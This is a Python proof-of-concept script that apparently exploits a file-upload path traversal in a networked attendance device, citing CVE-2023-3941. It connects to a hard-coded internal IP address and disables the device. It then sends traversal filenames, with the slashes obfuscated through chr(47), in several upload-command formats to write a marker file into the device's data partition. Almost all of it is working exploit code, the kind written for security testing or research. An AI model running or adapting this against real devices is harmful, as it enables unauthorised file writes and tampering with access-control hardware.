#!/usr/bin/env python3
"""Try various upload formats for USERPHOTO/PICTURE upload commands."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def cmd_str(c):
    return '0x%04X' % (c or 0)

def upload_v1(conn, upload_cmd, filename, data):
    """Send PREPARE_DATA + DATA + upload_cmd with filename."""
    sock = conn._ZK__sock
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    r2 = send_cmd(conn, const.CMD_DATA, data)
    r3 = send_cmd(conn, upload_cmd, filename)
    return r1, r2, r3

def upload_v2(conn, upload_cmd, filename, data):
    """Filename + size + data in single payload."""
    sock = conn._ZK__sock
    payload = filename + pack('I', len(data)) + data
    return None, None, send_cmd(conn, upload_cmd, payload)

def upload_v3(conn, upload_cmd, filename, data):
    """Filename + size + data WITHOUT PREPARE_DATA."""
    sock = conn._ZK__sock
    return None, None, send_cmd(conn, upload_cmd, filename + data)

def upload_v4(conn, upload_cmd, filename, data):
    """Send filename first, then PREPARE_DATA + DATA, then upload."""
    sock = conn._ZK__sock
    r0 = send_cmd(conn, upload_cmd, filename)  # First send filename
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', len(data)))
    r2 = send_cmd(conn, const.CMD_DATA, data)
    r3 = send_cmd(conn, upload_cmd, b'')  # Then trigger
    return r0, r1, r2, r3

def upload_v5(conn, upload_cmd, filename, data):
    """Filename + PREPARE_DATA + DATA chunks."""
    sock = conn._ZK__sock
    r1 = send_cmd(conn, upload_cmd, filename)
    r2 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', len(data)))
    if not r2.get('status'):
        return r1, r2, None
    r3 = send_cmd(conn, const.CMD_DATA, data)
    return r1, r2, r3

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

# Test filename + content
TRAV = (".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_evidence.txt").encode()
test_data = b'PWNED_BY_MAVIS_TEST_2026_CVE_2023_3941'

# Try UPLOAD_USERPHOTO with various formats
print('\n=== UPLOAD_USERPHOTO 0x2719 - format tests ===')
formats = [
    ('v1: PREPARE_DATA+DATA+upload(filename)', upload_v1),
    ('v2: filename+size+data single', upload_v2),
    ('v3: filename+data direct', upload_v3),
    ('v4: filename then PREPARE_DATA+DATA+commit', upload_v4),
    ('v5: filename+PREPARE_DATA+DATA', upload_v5),
]
for label, fn in formats:
    try:
        rs = fn(conn, 0x2719, TRAV, test_data)
        print('  {}: {}'.format(label, rs))
    except Exception as e:
        print('  {}: ERROR {}'.format(label, e))

# Try UPLOAD_PICTURE 0x272B with normal filename first
print('\n=== UPLOAD_PICTURE 0x272B - normal filename ===')
normal_fn = b'ad_1.jpg\x00'
for label, fn in formats[:3]:  # Test fewer for picture
    try:
        rs = fn(conn, 0x272B, normal_fn, test_data)
        print('  {}: {}'.format(label, rs))
    except Exception as e:
        print('  {}: ERROR {}'.format(label, e))

# Try CMD_UPLOAD_THEME 0x272A
print('\n=== UPLOAD_THEME 0x272A - normal ===')
for label, fn in formats[:2]:
    try:
        rs = fn(conn, 0x272A, b'theme.zip\x00', test_data)
        print('  {}: {}'.format(label, rs))
    except Exception as e:
        print('  {}: ERROR {}'.format(label, e))

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
